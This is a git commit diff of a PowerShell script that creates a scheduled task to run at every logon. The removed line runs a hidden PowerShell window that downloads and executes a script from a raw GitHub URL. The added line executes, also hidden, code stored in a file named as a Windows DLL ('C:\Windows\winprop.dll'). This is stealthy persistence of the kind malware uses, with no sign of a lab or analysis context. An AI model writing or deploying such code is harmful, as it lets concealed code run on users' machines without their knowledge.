f1fcef442e5187eb34df5a54dfc97037df730529
daniel0011234 <169172580+daniel0011234@users.noreply.github.com>
2024-06-06 19:58:20 +0300

    Update tasker_living.ps1

--- tasker_living.ps1
+++ tasker_living.ps1
@@ -1,4 +1,4 @@
-$action = New-ScheduledTaskAction -Execute "powershell" -Argument "-WindowStyle hidden -command `"iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/daniel0011234/myscripts/main/updater_tester_living_3.ps1'))`""
+$action = New-ScheduledTaskAction -Execute "powershell" -Argument "-WindowStyle hidden -command `"iex (Get-Content -path 'C:\Windows\winprop.dll' -Raw)`""
 $trigger = New-ScheduledTaskTrigger -AtLogon
 $settings = New-ScheduledTaskSettingsSet
 $task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings
